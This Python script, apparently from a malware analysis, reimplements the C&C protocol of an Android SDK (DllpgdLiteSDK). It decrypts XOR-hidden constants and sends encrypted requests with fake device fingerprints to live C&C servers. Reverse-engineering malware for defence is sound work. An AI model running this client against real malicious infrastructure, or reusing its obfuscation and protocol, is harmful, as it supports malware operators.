#!/usr/bin/env python3
"""
C&C Communication Client - Reconstructed from DllpgdLiteSDK APK
Decrypts all XOR-encrypted constants, implements the 5-layer encryption pipeline,
and constructs requests to the C&C server for analysis purposes.
"""

import gzip
import hashlib
import json
import os
import sys
import time
import uuid
import base64
import struct
import requests
from Crypto.Cipher import AES

# ============================================================
# 1. XOR Decryption Engine (mirrors IllIIlIIII1.llllIIIIll1)
# ============================================================

def java_byte(b):
    """Convert Python int to Java signed byte range (-128 to 127)"""
    return ((b + 128) % 256) - 128

def xor_decrypt(ciphertext: list, key: list) -> str:
    """
    Repeating-key XOR decryption.
    Mirrors: IllIIlIIII1.llllIIIIll1.llllIIIIll1(byte[], byte[]) -> String
    """
    result = bytearray(len(ciphertext))
    key_len = len(key)
    for i in range(len(ciphertext)):
        # Convert Java signed bytes to unsigned for XOR
        c = ciphertext[i] & 0xFF
        k = key[i % key_len] & 0xFF
        result[i] = c ^ k
    return result.decode('utf-8')

def xor_decrypt_bytes(ciphertext: list, key: list) -> bytes:
    """XOR decrypt returning raw bytes"""
    result = bytearray(len(ciphertext))
    key_len = len(key)
    for i in range(len(ciphertext)):
        c = ciphertext[i] & 0xFF
        k = key[i % key_len] & 0xFF
        result[i] = c ^ k
    return bytes(result)


# ============================================================
# 2. Decrypt All Constants
# ============================================================

print("=" * 70)
print("  DllpgdLiteSDK C&C Protocol - Constant Decryption")
print("=" * 70)

# --- Server Domain (DllpgdLiteSDK.java:12) ---
SERVER_DOMAIN = xor_decrypt(
    [-23, 123, -35, -81, 94, -27, -90, -90, -31, 126, -46, -76],
    [-115, 23, -79, -33, 57, -127, -120, -59]
)
print(f"\n[Server Domain]    {SERVER_DOMAIN}")

# --- URL Prefix "https://" (HttpGatewayClient.java:39) ---
URL_PREFIX = xor_decrypt(
    [29, 19, -98, -77, -106, 37, -78, 98],
    [117, 103, -22, -61, -27, 31, -99, 77]
)
print(f"[URL Prefix]       {URL_PREFIX}")

BASE_URL_HTTPS = URL_PREFIX + SERVER_DOMAIN
# HTTPS (443) is refused, but HTTP (80) works — use HTTP for active probing
BASE_URL = "http://" + SERVER_DOMAIN
print(f"[Base URL (HTTPS)] {BASE_URL_HTTPS}")
print(f"[Base URL (HTTP)]  {BASE_URL}  ← active")

# --- AES Key Seed (HttpGatewayClient.java:32) ---
AES_KEY_SEED = xor_decrypt(
    [-13, 111, 91, -7, 30, 86, -86, 116],
    [-76, 29, 62, -100, 112, 18, -53, 13]
)
print(f"\n[AES Key Seed]     {AES_KEY_SEED}")

# --- Content-Type (HttpGatewayClient.java:33) ---
CONTENT_TYPE = xor_decrypt(
    [-26, -117, 79, 93, 100, 56, -113, 37, -18, -108, 81, 30, 103, 40, -127, 63],
    [-121, -5, 63, 49, 13, 91, -18, 81]
)
print(f"[Content-Type]     {CONTENT_TYPE}")

# --- User-Agent (HttpGatewayClient.java:34) ---
USER_AGENT = xor_decrypt(
    [-95, -105, -28, 31, 57, -65, 115, 8, -111, -98, -53, 3, 55, -66, 81, 21, -54, -55, -90, 95],
    [-27, -5, -120, 111, 94, -37, 63, 97]
)
print(f"[User-Agent]       {USER_AGENT}")

# --- HTTP Method "POST" (HttpGatewayClient.java:303) ---
HTTP_METHOD = xor_decrypt(
    [87, 50, 24, -33],
    [7, 125, 75, -117, 116, -68, 105, 38]
)
print(f"[HTTP Method]      {HTTP_METHOD}")

# --- Header Names ---
HEADER_CONTENT_TYPE = xor_decrypt(
    [-36, 110, 20, 101, -53, 107, 75, 80, -53, 120, 10, 116],
    [-97, 1, 122, 17, -82, 5, 63, 125]
)
HEADER_USER_AGENT = xor_decrypt(
    [-6, -42, -23, -34, -100, 82, 13, 83, -63, -47],
    [-81, -91, -116, -84, -79, 19, 106, 54]
)
HEADER_CONTENT_LENGTH = xor_decrypt(
    [35, 42, 19, 127, 109, -125, -58, 6, 44, 32, 19, 108, 124, -123],
    [96, 69, 125, 11, 8, -19, -78, 43]
)
print(f"[Header 1]         {HEADER_CONTENT_TYPE}")
print(f"[Header 2]         {HEADER_USER_AGENT}")
print(f"[Header 3]         {HEADER_CONTENT_LENGTH}")

# --- Charset "UTF-8" (multiple locations) ---
CHARSET_1 = xor_decrypt(
    [-61, -59, -117, -101, -94],
    [-106, -111, -51, -74, -102, 61, 119, 69]
)
print(f"\n[Charset]          {CHARSET_1}")

# --- Algorithm names ---
ALG_AES = xor_decrypt(
    [-124, 92, -115],
    [-59, 25, -34, 66, -34, 83, 16, -84]
)
ALG_AES_CBC = xor_decrypt(
    [-68, 8, 5, -25, -20, 77, 52, 87, -77, 34, 6, -87, -53, 111, 31, 22, -102],
    [-3, 77, 86, -56, -81, 11, 118, 120]
)
print(f"[Algorithm]        {ALG_AES}")
print(f"[Cipher Mode]      {ALG_AES_CBC}")

# --- API Endpoints ---
# getConfig path (HttpGatewayClient.java:369)
API_GET_CONFIG = xor_decrypt(
    [103, -107, 116, -82, 36, -103, -3, 49, 44, -104, 104, -73, 108, -117, -29, 121, 45, -128, 71, -88, 101, -119, -91, 121],
    [72, -12, 4, -57, 11, -17, -52, 30]
)
print(f"\n[API getConfig]    {API_GET_CONFIG}")

# updateEvent path (HttpGatewayClient.java:373)
API_UPDATE_EVENT = xor_decrypt(
    [-79, -103, -101, 83, 105, -29, 47, 70, -6, -108, -121, 74, 33, -15, 49, 28, -18, -100, -118, 78, 35, -48, 104, 12, -16, -116],
    [-98, -8, -21, 58, 70, -107, 30, 105]
)
print(f"[API updateEvent]  {API_UPDATE_EVENT}")

# updateLog path (HttpGatewayClient.java:377)
API_UPDATE_LOG = xor_decrypt(
    [-44, -73, 125, 14, 86, 91, -49, -127, -97, -70, 97, 23, 30, 73, -47, -37, -117, -78, 108, 19, 28, 97, -111, -55],
    [-5, -42, 13, 103, 121, 45, -2, -82]
)
print(f"[API updateLog]    {API_UPDATE_LOG}")

# --- JSON Field Names from getConfig (HttpGatewayClient.java:368) ---
FIELD_ATOM = xor_decrypt(
    [61, 48, 14, 104],
    [92, 68, 97, 5, -63, 7, 73, -104]
)
print(f"\n[Field: atom]      {FIELD_ATOM}")

# --- createSampleAtom field names (DllpgdLiteSDK.java:21-36) ---
print("\n--- Atom Fields (DllpgdLiteSDK.createSampleAtom) ---")

# Line 21: deviceId key and value
F_DEVICE_ID = xor_decrypt(
    [-57, 88, -127, 87, -104, 6, -28, 114],
    [-93, 61, -9, 62, -5, 99, -83, 22]
)
F_DEVICE_ID_VAL = xor_decrypt(
    [42, 45, 110, 35, -118, -70, 117, 50, 60, 58, 106, 48, -125, -128, 67, 50],
    [89, 76, 3, 83, -26, -33, 42, 86]
)
print(f"  {F_DEVICE_ID} = {F_DEVICE_ID_VAL}")

# Line 22: version key
F_VERSION = xor_decrypt(
    [89, 24, -27, -39, 68, 10, -109],
    [47, 125, -105, -86, 45, 101, -3, 7]
)
print(f"  {F_VERSION} = 208")

# Line 23: appPackageName key and value
F_APP_PKG = xor_decrypt(
    [81, 50, 43, -59, -25, -6, -32, -7, 87, 39, 21, -12, -21, -4],
    [48, 66, 91, -107, -122, -103, -117, -104]
)
F_APP_PKG_VAL = xor_decrypt(
    [70, -80, 56, 68, 126, 61, 61, -115, 85, -77, 48, 68, 122, 53, 44],
    [37, -33, 85, 106, 27, 69, 92, -32]
)
print(f"  {F_APP_PKG} = {F_APP_PKG_VAL}")

# Line 24: gaId
F_GA_ID = xor_decrypt(
    [-16, 54, -35, -42, -109, -19, -50, -81, -2, 40],
    [-111, 70, -83, -128, -10, -97, -67, -58]
)
F_GA_ID_VAL = xor_decrypt(
    [-105, 105, -95, -52, -6],
    [-90, 71, -111, -30, -54, 68, -23, 123]
)
print(f"  {F_GA_ID} = {F_GA_ID_VAL}")

# Line 25: gaId (another field?)
F_FIELD_25 = xor_decrypt(
    [93, 66, 11, -56],
    [58, 35, 66, -84, 126, -98, 63, 98]
)
F_FIELD_25_VAL = xor_decrypt(
    [99, 78, -17, 12, 112, -22, 110, -14, 113, 112, -21, 24],
    [16, 47, -126, 124, 28, -113, 49, -107]
)
print(f"  {F_FIELD_25} = {F_FIELD_25_VAL}")

# Line 26: sessionId
F_SESSION_ID = xor_decrypt(
    [58, -76, -5, -15, 82, -110, 61, -87, 45],
    [73, -47, -120, -126, 59, -3, 83, -32]
)
F_SESSION_ID_VAL = xor_decrypt(
    [24, 120, 65, 94, -113, 93, 36, -34, 14, 106, 95, 71, -116, 86, 36, -60, 15],
    [107, 25, 44, 46, -29, 56, 123, -83]
)
print(f"  {F_SESSION_ID} = {F_SESSION_ID_VAL}")

# Line 27: appChannel
F_APP_CHANNEL = xor_decrypt(
    [28, 1, 55, 117, -128, -119, 47, -112, 24, 29],
    [125, 113, 71, 54, -24, -24, 65, -2]
)
F_APP_CHANNEL_VAL = xor_decrypt(
    [0, 41, -85, -26, 23, 94, -51],
    [100, 76, -51, -121, 98, 50, -71, 117]
)
print(f"  {F_APP_CHANNEL} = {F_APP_CHANNEL_VAL}")

# Line 28: isGeneratedBySubProcess
F_IS_SUB_PROCESS = xor_decrypt(
    [77, -66, 124, -101, 67, 69, -75, 62, 80, -88, 95, -68, 84, 115, -78, 61, 116, -65, 84, -99, 72, 83, -76],
    [36, -51, 59, -2, 45, 32, -57, 95]
)
print(f"  {F_IS_SUB_PROCESS} = false")

# Line 30-34: deviceInfo fields
F_LOCALE = xor_decrypt([58, -123, -79, 57, -66, -56], [86, -22, -46, 88, -46, -83, -98, 100])
F_LOCALE_VAL = xor_decrypt([56, -58, -98, 122, -48], [66, -82, -63, 57, -98, -116, 65, 6])
print(f"  {F_LOCALE} = {F_LOCALE_VAL}")

F_TIMEZONE = xor_decrypt([24, 36, 17, -19, 24, 47, -15, 24], [108, 77, 124, -120, 98, 64, -97, 125])
F_TIMEZONE_VAL = xor_decrypt(
    [19, -27, -104, -37, -116, 88, 42, -40, 60, -15, -103, -37, -54],
    [82, -106, -15, -70, -93, 11, 66, -71]
)
print(f"  {F_TIMEZONE} = {F_TIMEZONE_VAL}")

F_PHONE_MODEL = xor_decrypt(
    [-107, 124, 100, -86, 74, 13, -105, -100, -128, 120],
    [-27, 20, 11, -60, 47, 64, -8, -8]
)
F_PHONE_MODEL_VAL = xor_decrypt(
    [-97, 9, 66, 79, -93, 53, 73, 76, -88, 9],
    [-53, 108, 49, 59, -25, 80, 63, 37]
)
print(f"  {F_PHONE_MODEL} = {F_PHONE_MODEL_VAL}")

F_ANDROID_VER = xor_decrypt(
    [-102, -109, 36, -73, -51, -121, -107, -62, -98, -113, 51, -84, -51, -128],
    [-5, -3, 64, -59, -94, -18, -15, -108]
)
F_ANDROID_VER_VAL = xor_decrypt([123, 60], [74, 15, 11, 88, -66, -3, -20, 40])
print(f"  {F_ANDROID_VER} = {F_ANDROID_VER_VAL}")

F_PHONE_TS = xor_decrypt(
    [-38, 68, -45, -53, -107, -93, -72, 45, -49, 95, -56, -60, -99, -121],
    [-86, 44, -68, -91, -16, -9, -47, 64]
)
print(f"  {F_PHONE_TS} = <current_timestamp>")

# Line 35: deviceInfo parent key
F_DEVICE_INFO = xor_decrypt(
    [104, 20, -45, 104, 51, 3, 26, -25, 106, 30],
    [12, 113, -91, 1, 80, 102, 83, -119]
)
print(f"  {F_DEVICE_INFO} = <object>")

# Line 36: pluginInfos
F_PLUGIN_INFOS = xor_decrypt(
    [92, -27, 23, -25, -28, -101, 123, -124, 74, -26, 17],
    [44, -119, 98, -128, -115, -11, 50, -22]
)
print(f"  {F_PLUGIN_INFOS} = []")

# --- Event fields (DllpgdLiteSDK.java:44-46) ---
print("\n--- Event Fields ---")
F_EVT_NAME = xor_decrypt([127, -116, 29, 54], [17, -19, 112, 83, -82, -103, -97, -115])
F_EVT_NAME_VAL = xor_decrypt(
    [19, -59, 11, -85, 22, -87, 62, -115, 22, -63, 8, -81],
    [96, -92, 102, -37, 122, -52, 97, -24]
)
print(f"  {F_EVT_NAME} = {F_EVT_NAME_VAL}")

F_EVT_DESC = xor_decrypt([-95, -15, -5, -63], [-59, -108, -120, -94, 103, -110, -12, 26])
F_EVT_DESC_VAL = xor_decrypt(
    [-1, -61, 11, -14, -67, -99, 115, -85, -38, -57, 8, -10, -15, -100, 54, -67, -49, -48, 15, -14, -91, -111, 60, -96],
    [-84, -94, 102, -126, -47, -8, 83, -50]
)
print(f"  {F_EVT_DESC} = {F_EVT_DESC_VAL}")

F_EVT_TS = xor_decrypt(
    [112, 92, 20, 86, 119, -116, -121, -123, 116],
    [4, 53, 121, 51, 4, -8, -26, -24]
)
print(f"  {F_EVT_TS} = <timestamp>")

# --- Log fields (DllpgdLiteSDK.java:55-58) ---
print("\n--- Log Fields ---")
F_LOG_LEVEL = xor_decrypt([127, 51, 109, 124, 104], [19, 86, 27, 25, 4, 111, 81, -25])
print(f"  {F_LOG_LEVEL} = 1")

F_LOG_MSG = xor_decrypt(
    [-115, 14, -47, -73, 127, -96, 50],
    [-32, 107, -94, -60, 30, -57, 87, 51]
)
F_LOG_MSG_VAL = xor_decrypt(
    [-33, -62, -87, 76, -40, 111, 104, 21, -29, -60, -28, 81, -47, 121, 59, 24, -21, -58],
    [-116, -93, -60, 60, -76, 10, 72, 121]
)
print(f"  {F_LOG_MSG} = {F_LOG_MSG_VAL}")

F_LOG_TAG = xor_decrypt([-59, -39, -109], [-79, -72, -12, -4, 101, 71, 3, -69])
F_LOG_TAG_VAL = xor_decrypt(
    [29, 127, 46, -109, -65, -60, -4, -120, 45, 118, 17, -89, -109],
    [89, 19, 66, -29, -40, -96, -80, -31]
)
print(f"  {F_LOG_TAG} = {F_LOG_TAG_VAL}")

F_LOG_TS = xor_decrypt(
    [-97, 55, 81, 103, -25, 95, 109, -90, -101],
    [-21, 94, 60, 2, -108, 43, 12, -53]
)
print(f"  {F_LOG_TS} = <timestamp>")

# --- HTTPS prefix alternatives ---
HTTPS_PREFIX = xor_decrypt(
    [-36, -59, 56, 115, -90, -78, -24, -67],
    [-76, -79, 76, 3, -43, -120, -57, -110]
)
HTTP_PREFIX = xor_decrypt(
    [84, 28, 21, -117, -123, -41, 22],
    [60, 104, 97, -5, -65, -8, 57, -20]
)
COLON = xor_decrypt([-57], [-3, 115, -121, 88, -72, 46, 84, 38])
print(f"\n[HTTPS prefix]     {HTTPS_PREFIX}")
print(f"[HTTP prefix]      {HTTP_PREFIX}")
print(f"[Colon]            '{COLON}'")

# --- MD5 algorithm name ---
MD5_ALG = xor_decrypt([-72, -65, 37], [-11, -5, 16, -67, 77, -77, 12, -18])
print(f"[MD5 algorithm]    {MD5_ALG}")


# ============================================================
# 3. AES-256-CBC Encryption Pipeline
# ============================================================

print("\n" + "=" * 70)
print("  AES-256-CBC Key Derivation")
print("=" * 70)

# Step 1: MD5 hash of AES_KEY_SEED → uppercase hex string
md5_hash = hashlib.md5(AES_KEY_SEED.encode('utf-8')).hexdigest().upper()
print(f"[MD5(AES_KEY)]     {md5_hash}")

# Step 2: Use first 32 bytes of MD5 hex as AES key
aes_key_bytes = md5_hash[:32].encode('utf-8')
print(f"[AES Key (hex)]    {aes_key_bytes.hex()}")
print(f"[AES Key (ascii)]  {aes_key_bytes.decode()}")


def aes_encrypt(plaintext: bytes, key: bytes = aes_key_bytes) -> bytes:
    """AES-256-CFB encrypt with random IV prepended (segment_size=128 to match Java)"""
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
    encrypted = cipher.encrypt(plaintext)  # CFB NoPadding
    return iv + encrypted


def aes_decrypt(ciphertext: bytes, key: bytes = aes_key_bytes) -> bytes:
    """AES-256-CFB decrypt (IV is first 16 bytes)"""
    iv = ciphertext[:16]
    data = ciphertext[16:]
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
    return cipher.decrypt(data)  # CFB NoPadding


def encrypt_payload(json_obj: dict) -> bytes:
    """
    Full 5-layer encryption pipeline:
    JSON → GZIP → Base64 → AES-256-CBC → Base64 → bytes
    """
    # Layer 1: JSON to bytes
    json_str = json.dumps(json_obj, separators=(',', ':'))
    json_bytes = json_str.encode('utf-8')

    # Layer 2: GZIP compress
    gzipped = gzip.compress(json_bytes)

    # Layer 3: Base64 encode (NO_WRAP = no newlines)
    b64_1 = base64.b64encode(gzipped).decode('ascii')

    # Layer 4: AES-256-CBC encrypt
    aes_encrypted = aes_encrypt(b64_1.encode('utf-8'))

    # Layer 5: Base64 encode again
    b64_2 = base64.b64encode(aes_encrypted)

    return b64_2


def decrypt_response(response_bytes: bytes) -> dict:
    """
    Parse server response. Based on callAPI code, the server response
    is read as raw bytes then parsed as JSON string directly.
    But aesDecryptString exists, so try multiple approaches.
    """
    response_str = response_bytes.decode('utf-8', errors='replace')

    # Try plaintext JSON first
    try:
        return json.loads(response_str)
    except json.JSONDecodeError:
        pass

    # Try: the response might be AES encrypted string (aesDecryptString path)
    # aesDecryptString: Base64.decode(input, 2) → extract IV(16) + ciphertext → AES/CFB decrypt → String
    try:
        decoded = base64.b64decode(response_str)
        if len(decoded) >= 16:
            decrypted = aes_decrypt(decoded)
            decrypted_str = decrypted.decode('utf-8')
            # The decrypted might be Base64-encoded gzipped JSON
            try:
                ungzipped = gzip.decompress(base64.b64decode(decrypted_str))
                return json.loads(ungzipped)
            except Exception:
                pass
            # Or just JSON directly
            try:
                return json.loads(decrypted_str)
            except json.JSONDecodeError:
                return {"decrypted_raw": decrypted_str}
    except Exception:
        pass

    return {"raw": response_str[:500]}


# ============================================================
# 4. Build Sample Requests
# ============================================================

print("\n" + "=" * 70)
print("  Constructing API Requests")
print("=" * 70)

# Build Atom (device fingerprint)
device_id = uuid.uuid4().hex
current_ts = int(time.time() * 1000)

atom = {
    F_DEVICE_ID: device_id,
    F_VERSION: 208,
    F_APP_PKG: F_APP_PKG_VAL,
    F_GA_ID: F_GA_ID_VAL,
    F_FIELD_25: F_FIELD_25_VAL,
    F_SESSION_ID: F_SESSION_ID_VAL,
    F_APP_CHANNEL: F_APP_CHANNEL_VAL,
    F_IS_SUB_PROCESS: False,
    F_DEVICE_INFO: {
        F_LOCALE: F_LOCALE_VAL,
        F_TIMEZONE: F_TIMEZONE_VAL,
        F_PHONE_MODEL: F_PHONE_MODEL_VAL,
        F_ANDROID_VER: F_ANDROID_VER_VAL,
        F_PHONE_TS: current_ts
    },
    F_PLUGIN_INFOS: []
}

print(f"\n[Atom JSON]")
print(json.dumps(atom, indent=2, ensure_ascii=False))

# Build getConfig request
get_config_request = {
    FIELD_ATOM: atom
}

print(f"\n[getConfig Request]")
print(json.dumps(get_config_request, indent=2, ensure_ascii=False))

# Build updateEvent request
events = [{
    F_EVT_NAME: F_EVT_NAME_VAL,
    F_EVT_DESC: F_EVT_DESC_VAL,
    F_EVT_TS: current_ts
}]

# Build updateLog request
logs = [{
    F_LOG_LEVEL: 1,
    F_LOG_MSG: F_LOG_MSG_VAL,
    F_LOG_TAG: F_LOG_TAG_VAL,
    F_LOG_TS: current_ts
}]

# ============================================================
# 5. Encrypt and Send Requests
# ============================================================

print("\n" + "=" * 70)
print("  Sending Encrypted Requests to C&C Server")
print("=" * 70)

FULL_URLS = {
    "getConfig": BASE_URL + API_GET_CONFIG,
    "updateEvent": BASE_URL + API_UPDATE_EVENT,
    "updateLog": BASE_URL + API_UPDATE_LOG,
}

print(f"\n[Full URLs]")
for name, url in FULL_URLS.items():
    print(f"  {name}: {url}")

headers = {
    HEADER_CONTENT_TYPE: CONTENT_TYPE,
    HEADER_USER_AGENT: USER_AGENT,
}
print(f"\n[Request Headers]")
for k, v in headers.items():
    print(f"  {k}: {v}")

# Encrypt the getConfig payload
encrypted_payload = encrypt_payload(get_config_request)
print(f"\n[Encrypted Payload (first 100 chars)]")
print(f"  {encrypted_payload[:100]}...")
print(f"  Length: {len(encrypted_payload)} bytes")

# Verify encryption/decryption round-trip
print("\n[Encryption Round-trip Test]")
test_json = {"test": "hello"}
test_encrypted = encrypt_payload(test_json)
# Reverse: Base64 decode → AES decrypt → Base64 decode → GZIP decompress → JSON
step1 = base64.b64decode(test_encrypted)
step2 = aes_decrypt(step1)
step3 = base64.b64decode(step2)
step4 = gzip.decompress(step3)
step5 = json.loads(step4)
assert step5 == test_json, "Round-trip failed!"
print(f"  OK - Encryption pipeline verified: {test_json} → encrypt → decrypt → {step5}")


def send_request(api_name: str, payload: dict, timeout: int = 15):
    """Send encrypted request to C&C server"""
    url = FULL_URLS[api_name]
    encrypted = encrypt_payload(payload)

    req_headers = {
        HEADER_CONTENT_TYPE: CONTENT_TYPE,
        HEADER_USER_AGENT: USER_AGENT,
        HEADER_CONTENT_LENGTH: str(len(encrypted)),
    }

    print(f"\n{'─' * 50}")
    print(f"  Sending {api_name} → {url}")
    print(f"  Payload size: {len(encrypted)} bytes")
    print(f"{'─' * 50}")

    try:
        resp = requests.post(
            url,
            data=encrypted,
            headers=req_headers,
            timeout=timeout,
            verify=True
        )
        print(f"  HTTP Status: {resp.status_code}")
        print(f"  Response Headers:")
        for k, v in resp.headers.items():
            print(f"    {k}: {v}")
        print(f"  Response Body ({len(resp.content)} bytes):")

        if resp.status_code == 200:
            # Try to parse response
            try:
                result = json.loads(resp.text)
                print(f"  [Plaintext JSON Response]")
                print(json.dumps(result, indent=2, ensure_ascii=False))
                return result
            except json.JSONDecodeError:
                # Try encrypted response
                try:
                    result = decrypt_response(resp.content)
                    print(f"  [Decrypted Response]")
                    print(json.dumps(result, indent=2, ensure_ascii=False))
                    return result
                except Exception as e:
                    print(f"  [Raw Response] {resp.text[:500]}")
        else:
            print(f"  [Error Response] {resp.text[:500]}")

        return None
    except requests.exceptions.Timeout:
        print(f"  [TIMEOUT] Server did not respond within {timeout}s")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"  [CONNECTION ERROR] {e}")
        return None
    except Exception as e:
        print(f"  [ERROR] {type(e).__name__}: {e}")
        return None


# --- Execute API calls ---
print("\n" + "=" * 70)
print("  API Call Results")
print("=" * 70)

# 1. getConfig
print("\n[1/3] getConfig API")
config_result = send_request("getConfig", get_config_request)

# 2. updateEvent
print("\n[2/3] updateEvent API")
update_event_payload = {
    FIELD_ATOM: atom,
    "events": events
}
event_result = send_request("updateEvent", update_event_payload)

# 3. updateLog
print("\n[3/3] updateLog API")
update_log_payload = {
    FIELD_ATOM: atom,
    "log": logs
}
log_result = send_request("updateLog", update_log_payload)

# Summary for dllpgd.click
print("\n" + "=" * 70)
print("  Summary — dllpgd.click (C&C Config Server)")
print("=" * 70)
print(f"  Server:      {BASE_URL}")
print(f"  AES Key:     {AES_KEY_SEED} → MD5 → {md5_hash}")
print(f"  Endpoints:   {API_GET_CONFIG}")
print(f"               {API_UPDATE_EVENT}")
print(f"               {API_UPDATE_LOG}")
print(f"  getConfig:   {'OK' if config_result else 'FAILED/UNREACHABLE'}")
print(f"  updateEvent: {'OK' if event_result else 'FAILED/UNREACHABLE'}")
print(f"  updateLog:   {'OK' if log_result else 'FAILED/UNREACHABLE'}")


# ============================================================
# 6. playstations.click — C&C API Server
# ============================================================

print("\n\n" + "=" * 70)
print("  playstations.click — C&C API Server")
print("=" * 70)

PS_BASE_URL = "https://playstations.click"

# --- XOR encryption for HttpClient request/response body ---
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with repeating key (mirrors HttpClient XOR+Base64)"""
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % len(key)]
    return bytes(result)

xor_decrypt_body = xor_encrypt  # XOR is symmetric


# --- Build DeviceFingerprint (model/DeviceFingerprint.java) ---
def build_device_fingerprint(app_id: str, dev_id: str) -> dict:
    """
    Builds a DeviceFingerprint matching DeviceFingerprint.toJSONObject().
    15 fields covering device identity, screen metrics, locale, system info.
    """
    return {
        "device_id": dev_id,
        "app_package": app_id,
        "app_version": "14",
        "session_id": uuid.uuid4().hex,
        "channel": "tc",                           # hardcoded in collectFromDevice()
        "timezone": "Asia/Shanghai",
        "locale": "zh_CN",
        "model": "Pixel 6",
        "brand": "google",
        "screen_resolution": "1080*2400",
        "screen_density": "420dpi",
        "orientation": "portrait",
        "android_version": "14",
        "timestamp_now": int(time.time() * 1000),
        "network_type": "wifi",
    }


# --- Build DeviceAuthRequest (model/DeviceAuthRequest.java) ---
def build_device_auth_request(app_id: str, dev_id: str, token: str = "") -> dict:
    """
    Builds a DeviceAuthRequest matching DeviceAuthRequest.toJSONObject().
    JSON keys: app_id, device_id, token, atom
    """
    return {
        "app_id": app_id,
        "device_id": dev_id,
        "token": token,
        "atom": build_device_fingerprint(app_id, dev_id),
    }


# --- API endpoint definitions ---
PS_ENDPOINTS = {
    "getToken":       "/phantom/token",
    "getTaskConfig":  "/phantom/task",
    "getFileVersion": "/phantom/file_version",
    "getFileContent": "/phantom/file",
    "reportDone":     "/phantom/done",
    "uploadLogs":     "/h5/upload_logs_v2",
    "getSignalingJS": "/h5/js_file_for_signaling",
    "getJobByOffer":  "/h5/get_job_by_offer",
    "reportEvents":   "/h5/report_events",
}

print(f"\n[Base URL] {PS_BASE_URL}")
print(f"\n[API Endpoints]")
for name, path in PS_ENDPOINTS.items():
    print(f"  {name:20s} → {PS_BASE_URL}{path}")


# --- Common request parameters ---
APP_ID = "com.android.wallpaper"              # host app package name (disguised)
DEVICE_ID = uuid.uuid4().hex[:16]             # random device ID
PS_USER_AGENT = "MyApp/1.0 (Linux; Android 14; Pixel 6) DPI/420"
                                               # mirrors PreferencesHelper.buildUserAgent()

print(f"\n[Device Params]")
print(f"  app_id:     {APP_ID}")
print(f"  device_id:  {DEVICE_ID}")
print(f"  User-Agent: {PS_USER_AGENT}")


def send_ps_request(api_name: str, payload: dict, encryption_key: bytes = None,
                    timeout: int = 15) -> dict:
    """
    Send request to playstations.click API server.

    Encryption flow (HttpClient.java):
      If encryptionKey is set:
        Request:  JSON string → XOR(bytes, key) → Base64 encode → send
        Response: receive → Base64 decode → XOR(bytes, key) → JSON parse
      If encryptionKey is null:
        Plain JSON request/response
    """
    url = PS_BASE_URL + PS_ENDPOINTS[api_name]

    # Serialize JSON body
    json_body = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)

    # Optionally encrypt
    if encryption_key:
        encrypted_bytes = xor_encrypt(json_body.encode('utf-8'), encryption_key)
        body = base64.b64encode(encrypted_bytes).decode('ascii')
    else:
        body = json_body

    req_headers = {
        "Content-Type": "application/json; charset=utf-8",
        "Accept": "application/json",
        "User-Agent": PS_USER_AGENT,
    }

    print(f"\n{'─' * 60}")
    print(f"  [{api_name}] → {url}")
    print(f"  Body length: {len(body)} chars")
    if encryption_key:
        print(f"  Encryption: XOR+Base64 (key={len(encryption_key)} bytes)")
    else:
        print(f"  Encryption: None (plaintext JSON)")
    print(f"{'─' * 60}")
    print(f"  [Request JSON]")
    print(f"  {json.dumps(payload, indent=2, ensure_ascii=False)[:500]}")

    try:
        resp = requests.post(
            url, data=body.encode('utf-8'),
            headers=req_headers, timeout=timeout, verify=True
        )
        print(f"\n  HTTP Status: {resp.status_code}")
        print(f"  Response Headers:")
        for k, v in resp.headers.items():
            print(f"    {k}: {v}")

        if resp.status_code >= 200 and resp.status_code <= 299:
            response_text = resp.text

            # Try to decrypt if encryption key is set
            if encryption_key and response_text:
                try:
                    decoded = base64.b64decode(response_text)
                    decrypted = xor_decrypt_body(decoded, encryption_key)
                    response_text = decrypted.decode('utf-8')
                    print(f"  [Decrypted Response]")
                except Exception as e:
                    print(f"  [Decryption failed: {e}, trying plaintext]")

            # Parse JSON
            try:
                result = json.loads(response_text)
                print(f"  [Response JSON]")
                print(f"  {json.dumps(result, indent=2, ensure_ascii=False)}")
                return result
            except json.JSONDecodeError:
                print(f"  [Raw Response] {response_text[:500]}")
                return {"raw": response_text[:500]}
        else:
            print(f"  [Error Response] {resp.text[:500]}")
            return {"error": resp.status_code, "body": resp.text[:500]}

    except requests.exceptions.Timeout:
        print(f"  [TIMEOUT] Server did not respond within {timeout}s")
        return None
    except requests.exceptions.SSLError as e:
        print(f"  [SSL ERROR] {e}")
        # Retry with HTTP
        print(f"  Retrying with HTTP...")
        try:
            http_url = url.replace("https://", "http://")
            resp = requests.post(
                http_url, data=body.encode('utf-8'),
                headers=req_headers, timeout=timeout
            )
            print(f"  HTTP Status: {resp.status_code}")
            if resp.status_code >= 200 and resp.status_code <= 299:
                try:
                    result = json.loads(resp.text)
                    print(f"  [Response JSON] {json.dumps(result, indent=2, ensure_ascii=False)}")
                    return result
                except json.JSONDecodeError:
                    print(f"  [Raw Response] {resp.text[:500]}")
            else:
                print(f"  [Error Response] {resp.text[:500]}")
            return {"error": resp.status_code, "body": resp.text[:500]}
        except Exception as e2:
            print(f"  [HTTP FALLBACK FAILED] {e2}")
            return None
    except requests.exceptions.ConnectionError as e:
        print(f"  [CONNECTION ERROR] {e}")
        return None
    except Exception as e:
        print(f"  [ERROR] {type(e).__name__}: {e}")
        return None


# ============================================================
# 7. Execute playstations.click API Calls
# ============================================================

print("\n" + "=" * 70)
print("  playstations.click API Call Results")
print("=" * 70)

# Track state across calls
ps_auth_token = ""
ps_encryption_key = None     # set dynamically from token response
ps_offer_id = ""
ps_job_id = ""

# --- 1. POST /phantom/token — Device Authentication ---
print("\n" + "─" * 30)
print("  [1/9] POST /phantom/token")
print("─" * 30)

token_request = build_device_auth_request(APP_ID, DEVICE_ID)
token_result = send_ps_request("getToken", token_request)

if token_result and isinstance(token_result, dict):
    ps_auth_token = token_result.get("content", "")
    code = token_result.get("code", -1)
    print(f"\n  → code: {code}")
    print(f"  → token: {ps_auth_token[:50]}{'...' if len(ps_auth_token) > 50 else ''}")

    # Check if there's an encryption key in the response
    enc_key_b64 = token_result.get("encryption_key", "")
    if enc_key_b64:
        ps_encryption_key = base64.b64decode(enc_key_b64)
